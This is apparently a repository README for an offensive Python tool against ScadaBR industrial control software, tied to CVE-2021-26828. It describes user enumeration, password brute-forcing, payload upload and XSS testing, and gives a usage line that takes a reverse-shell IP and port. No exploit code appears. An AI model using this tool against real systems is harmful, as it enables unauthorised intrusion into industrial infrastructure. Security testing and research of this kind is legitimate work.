# ScadaBRExplorer
This repository will be used for uploading multiple scripts!
<h1>Please use responsibly, only for educational purposes</h1>
<h3>Not responsible if you use this irresponsibly</h3>

<p>Credit: <br>
Exploit Author: Fellipe Oliveira CVE-2021-26828 (Kudos to Fellipe!)<br>
ScadaBR: https://www.scadabr.com.br/ <br>
Tested versions and OS: ScadaBR 1.0, ScadaBR 1.1CE on Linux, Windows 10 <br>
</p>

<h2>About the software</h2>
<p>
This software, enumerates users for ScadaBR, and tries to brute force the password.<br>
If the user gets a valid login, then asks if you want to upload the "payload" for Windows or Linux <br>
Last option you can get an XSS payload to test the XSS vulnerability <br>
</p>

<h2>Usage</h2>
<p>
python3 scadabrute.py --ip ip --port port --revip (reverse_shell ip) --revport (reverse_shell port) <br>
Last two are optional, in case you don't care about it! <br>
Please create a usernames.txt file and passwords.txt file in order to use the user enumeration and password guessing functions! <br>
</p>
